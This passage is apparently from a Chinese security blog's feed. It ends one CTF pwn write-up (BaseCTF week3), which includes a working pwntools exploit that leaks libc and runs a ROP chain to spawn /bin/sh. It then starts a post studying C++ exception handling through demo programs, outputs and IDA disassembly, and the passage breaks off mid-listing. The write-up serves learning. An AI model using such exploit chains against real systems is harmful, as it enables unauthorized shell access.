src="https://c-lby.top/images/ret2libc_start_main/%E6%A0%88%E8%BF%98%E5%8E%9F.png" alt="栈还原"></p><p>程序从rsp+8处取main地址，栈刚好满足。这是因为main函数执行之前就存在过__libc_start_main函数的栈帧，而main函数正常返回也会回到这个栈帧里来。换句话说，只要我在之前的操作中没有破坏到这个地方，那么函数就能正常从栈中取到main地址，从而实现重启main函数。</p><p>那这道题下面就很简单，因为可以实现重启main，那我们就可以利用第一次printf覆盖\x00带出libc地址，然后获取libc基址，第二次回到main函数的时候再ROP执行binsh即可。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r = remote(&#x27;challenge.basectf.fun&#x27;, 35787)</span></span><br><span class="line">r = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment"># e = ELF(&#x27;./vuln&#x27;)</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+<span class="string">b&#x27;\x1e&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b *$rebase(0x123e)&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">libc_base = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x29d1e</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">rdi = libc_base+<span class="number">0x2a3e5</span></span><br><span class="line">ret = libc_base+<span class="number">0x29139</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+p64(rdi)+p64(binsh_addr)+p64(ret)+p64(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">BaseCTF week3 PWN PIE</summary>
    
    
    
    <category term="ret2__libc_start_main" scheme="https://c-lby.top/categories/ret2-libc-start-main/"/>
    
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="ROP" scheme="https://c-lby.top/tags/ROP/"/>
    
  </entry>
  
  <entry>
    <title>C++异常处理机制及其利用研究</title>
    <link href="https://c-lby.top/2024/08/28/cpp-exception/"/>
    <id>https://c-lby.top/2024/08/28/cpp-exception/</id>
    <published>2024-08-28T06:14:49.000Z</published>
    <updated>2024-08-28T21:56:05.004Z</updated>
    
    <content type="html"><![CDATA[<h3 id="自己的理解与尝试"><a href="#自己的理解与尝试" class="headerlink" title="自己的理解与尝试"></a>自己的理解与尝试</h3><h4 id="编写demo看执行结果"><a href="#编写demo看执行结果" class="headerlink" title="编写demo看执行结果"></a>编写demo看执行结果</h4><p><a href="https://www.cnblogs.com/catch/p/3604516.html">参考资料</a>然后根据资料里的demo自己改了一下看看实际try…catch是怎么运行的</p><h5 id="demo1"><a href="#demo1" class="headerlink" title="demo1"></a>demo1</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func3 start&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">throw</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func3&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func2&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">test_func3</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (<span class="type">int</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;catch 2&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func2 exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func1&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">test_func2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (...)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;catch 1&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func1 exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">test_func1</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;main exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">test func1</span><br><span class="line">test func2</span><br><span class="line">func3 start</span><br><span class="line">catch 2</span><br><span class="line">func2 exit</span><br><span class="line">func1 exit</span><br><span class="line">main exit</span><br></pre></td></tr></table></figure><p>可以看到<code>func3</code>抛出异常之后，throw后面的代码不再执行。因为func3本身没有catch，所以会从他的调用者去找catch。这里catch理解成异常处理函数。catch2执行完之后会继续把func2、func1和main执行完。</p><h5 id="demo2"><a href="#demo2" class="headerlink" title="demo2"></a>demo2</h5><p>现在我们试试吧catch2也去掉：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func3 start&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">throw</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func3&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func2&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">test_func3</span>();</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func2 exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func1&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">test_func2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (...)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;catch 1&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func1 exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">test_func1</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;main exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">test func1</span><br><span class="line">test func2</span><br><span class="line">func3 start</span><br><span class="line">catch 1</span><br><span class="line">func1 exit</span><br><span class="line">main exit</span><br></pre></td></tr></table></figure><p>可以看到由于func2也找不到catch，所以会沿着调用链继续向上找，找到了func1处的catch。伴随着func2中的catch的消失而发生的另一个变化是，func2也没有执行完，但是会从func1的catch后继续执行。</p><h5 id="demo3"><a href="#demo3" class="headerlink" title="demo3"></a>demo3</h5><p>接下来试试在程序中不定义catch看看会发生什么：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func3 start&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">throw</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func3&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func2&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">test_func3</span>();</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func2 exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func1&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">test_func2</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func1 exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">test_func1</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;main exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test func1</span><br><span class="line">test func2</span><br><span class="line">func3 start</span><br><span class="line">terminate called after throwing an instance of &#x27;int&#x27;</span><br><span class="line">Aborted</span><br></pre></td></tr></table></figure><p>程序直接aborted了。</p><p>突发奇想，我们把刚刚实验生成的程序放到IDA中看看长什么样。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">test_func3</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *exception; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;func3 start&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v0, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  exception = __cxa_allocate_exception(<span class="number">4uLL</span>);</span><br><span class="line">  *exception = <span class="number">3</span>;</span><br><span class="line">  __cxa_throw(exception, (<span class="keyword">struct</span> type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span><span class="type">int</span>, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>抛出异常部分的伪代码长这样。但是catch部分并不会出现在伪代码中，但是会体现在汇编当中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001341 ;   try &#123;</span><br><span class="line">.text:0000000000001341                 call    _Z10test_func2v ; test_func2(void)</span><br><span class="line">.text:0000000000001341 ;   &#125; // starts at 1341</span><br><span class="line">.text:0000000000001346 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000001346</span><br><span class="line">.text:0000000000001346 loc_1346:                               ; CODE XREF: test_func1(void)+A6↓j</span><br><span class="line">.text:0000000000001346                 lea     rax, aFunc1Exit ; &quot;func1 exit&quot;</span><br><span class="line">.text:000000000000134D                 mov     rsi, rax</span><br><span class="line">.text:0000000000001350                 lea     rax, _ZSt4cout@GLIBCXX_3_4</span><br><span class="line">.text:0000000000001357                 mov     rdi, rax</span><br><span class="line">.text:000000000000135A                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::ostream &amp;,char const*)</span><br><span class="line">.text:000000000000135F                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr</span><br><span class="line">.text:0000000000001366                 mov     rsi, rdx</span><br><span class="line">.text:0000000000001369                 mov     rdi, rax</span><br><span class="line">.text:000000000000136C                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator&lt;&lt;(std::ostream &amp; (*)(std::ostream &amp;))</span><br><span class="line">.text:0000000000001371                 jmp     short loc_13C8</span><br><span class="line">.text:0000000000001373 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000001373 ;   catch(...) // owned by 1341</span><br><span class="line">.text:0000000000001373                 endbr64</span><br><span class="line">.text:0000000000001377                 mov     rdi, rax        ; void *</span><br><span class="line">.text:000000000000137A                 call    ___cxa_begin_catch</span><br><span class="line">.text:000000000000137F                 lea     rax, aCatch1    ; &quot;catch 1&quot;</span><br><span class="line">.text:0000000000001386                 mov     rsi, rax</span><br><span class="line">.text:0000000000001389                 lea     rax, _ZSt4cout@GLIBCXX_3_4</span><br><span class="line">.text:0000000000001390                 mov     rdi, rax</span><br><span class="line">.text:0000000000001393 ;   try &#123;</span><br><span class="line">.text:0000000000001393                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::ostream &amp;,char const*)</span><br><span class="line">.text:0000000000001398                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr</span><br><span class="line">.text:000000000000139F                 mov     rsi, rdx</span><br><span class="line">.text:00000000000013A2                 mov     rdi, rax</span><br><span class="line">.text:00000000000013A5                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator&lt;&lt;(std::ostream &amp; (*)(std::ostream &amp;))</span><br><span class="line">.text:00000000000013A5 ;   &#125; // starts at 1393</span><br><span class="line">.text:00000000000013AA                 call    ___cxa_end_catch</span><br><span class="line">.text:00000000000013AF                 jmp     short loc_1346</span><br><span class="line">.text:00000000000013B1 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000013B1 ;   cleanup() // owned by 1393</span><br><span class="line">.text:00000000000013B1                 endbr64</span><br><span class="line">.text:00000000000013B5                 mov     rbx, rax</span><br><span class="line">.text:00000000000013B8                 call    ___cxa_end_catch</span><br><span class="line">.text:00000000000013BD                 mov     rax, rbx</span><br><span class="line">.text:00000000000013C0                 mov     rdi, rax        ; struct _Unwind_Exception *</span><br><span class="line">.text:00000000000013C3                 call    __Unwind_Resume</span><br><span class="line">.text:00000000000013C8 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000013C8</span><br><span class="line">.text:00000000000013C8 loc_13C8:                               ; CODE XREF: test_func1(void)+68↑j</span><br><span class="line">.text:00000000000013C8                 mov     rbx, [rbp+var_8]</span><br><span class="line">.text:00000000000013CC                 leave</span><br><span class="line">.text:00000000000013CD                 retn</span><br><span class="line">.text:00000000000013CD ; &#125; // starts at 1309</span><br><span class="line">.text:00000000000013CD _Z10test_func1v endp</span><br></pre></td></tr></table></figure><p>可以看到0x13AF处执行完catch之后jmp到了0x1346，这个地方正好对应源码里func1 exit的部分。说明catch完会直接从当前位置继续执行。</p><p>那这里就会产生一个想法，比如说我如果想通过这个劫持执行流，我是否可以直接劫持func1的返回地址就行？</p><p>网上关于异常处理漏洞利用的地方几乎完全没看懂，所以打算自己动调看看到底程序在catch的时候发生了什么。</p><h4 id="网上的说法"><a href="#网上的说法" class="headerlink" title="网上的说法"></a>网上的说法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1）调用 __cxa_allocate_exception 函数，分配一个异常对象。</span><br><span class="line">2）调用 __cxa_throw 函数，这个函数会将异常对象做一些初始化。</span><br><span class="line">3）__cxa_throw() 调用 Itanium ABI 里的 _Unwind_RaiseException() 从而开始 unwind。</span><br><span class="line">4）_Unwind_RaiseException() 对调用链上的函数进行 unwind 时，调用 personality routine。</span><br><span class="line">5）如果该异常如能被处理(有相应的 catch)，则 personality routine 会依次对调用链上的函数进行清理。</span><br><span class="line">6）_Unwind_RaiseException() 将控制权转到相应的catch代码。</span><br></pre></td></tr></table></figure><p>几乎每一篇博客都能看到这些流程，但是我看得一头雾水，直到我自己动调看了程序的变化才有点头绪。</p><h4 id="在动调里挣扎"><a href="#在动调里挣扎" class="headerlink" title="在动调里挣扎"></a>在动调里挣扎</h4><p>我用了第一个demo的程序来做动调。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001249 ; void __noreturn test_func3(void)</span><br><span class="line">.text:0000000000001249                 public _Z10test_func3v</span><br><span class="line">.text:0000000000001249 _Z10test_func3v proc near               ; CODE XREF: test_func2(void)+38↓p</span><br><span class="line">.text:0000000000001249 ; __unwind &#123;</span><br><span class="line">.text:0000000000001249                 endbr64</span><br><span class="line">.text:000000000000124D                 push    rbp</span><br><span class="line">.text:000000000000124E                 mov     rbp, rsp</span><br><span class="line">.text:0000000000001251                 lea     rax, aFunc3Start ; &quot;func3 start&quot;</span><br><span class="line">.text:0000000000001258                 mov     rsi, rax</span><br><span class="line">.text:000000000000125B                 lea     rax, _ZSt4cout@GLIBCXX_3_4</span><br><span class="line">.text:0000000000001262                 mov     rdi, rax</span><br><span class="line">.text:0000000000001265                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::ostream &amp;,char const*)</span><br><span class="line">.text:000000000000126A                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr</span><br><span class="line">.text:0000000000001271                 mov     rsi, rdx</span><br><span class="line">.text:0000000000001274                 mov     rdi, rax</span><br><span class="line">.text:0000000000001277                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator&lt;&lt;(std::ostream &amp; (*)(std::ostream &amp;))</span><br><span class="line">.text:000000000000127C                 mov     edi, 4          ; thrown_size</span><br><span class="line">.text:0000000000001281                 call    ___cxa_allocate_exception</span><br><span class="line">.text:0000000000001286                 mov     dword ptr [rax], 3</span><br><span class="line">.text:000000000000128C                 mov     edx, 0          ; void (*)(void *)</span><br><span class="line">.text:0000000000001291                 lea     rcx, _ZTIi@CXXABI_1_3</span><br><span class="line">.text:0000000000001298                 mov     rsi, rcx        ; lptinfo</span><br><span class="line">.text:000000000000129B                 mov     rdi, rax        ; void *</span><br><span class="line">.text:000000000000129E                 call    ___cxa_throw</span><br><span class="line">.text:000000000000129E ; &#125; // starts at 1249</span><br><span class="line">.text:000000000000129E _Z10test_func3v endp</span><br><span class="line">.text:000000000000129E</span><br><span class="line">.text:00000000000012A3</span><br><span class="line">.text:00000000000012A3 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:00000000000012A3</span><br><span class="line">.text:00000000000012A3 ; Attributes: bp-based frame</span><br><span class="line">.text:00000000000012A3</span><br><span class="line">.text:00000000000012A3 ; void __noreturn 